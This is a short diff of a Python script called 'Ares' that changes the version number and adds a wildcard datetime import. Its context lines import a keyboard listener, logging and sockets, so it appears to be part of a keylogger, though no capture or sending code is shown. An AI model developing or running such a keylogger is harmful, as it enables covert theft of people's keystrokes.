@@ -1,4 +1,4 @@
-#Ares v2.0.0.0
+#Ares v2.0.0.1
 
 from pynput.keyboard import Key, Listener
 import logging
@@ -11,6 +11,7 @@ import os
 import socket
 import datetime
 import sys
+from datetime import *
 
 log_dir = ""
 
